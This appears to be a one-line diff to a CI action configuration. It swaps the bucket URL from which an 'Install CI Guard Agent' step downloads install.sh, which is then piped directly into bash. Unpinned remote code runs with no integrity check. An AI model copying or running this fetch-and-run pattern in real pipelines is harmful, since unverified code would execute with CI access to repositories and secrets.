@@ -77,7 +77,7 @@ runs:
     - name: Install CI Guard Agent
       shell: bash
       run: |
-        curl -fsSL "https://storage.googleapis.com/test-bucket-01262026/install.sh?$(date +%s)" | bash -s -- --pr-review
+        curl -fsSL "https://storage.googleapis.com/test-bucket-01232026/install.sh?$(date +%s)" | bash -s -- --pr-review
 
     - name: Run CI Guard
       shell: bash
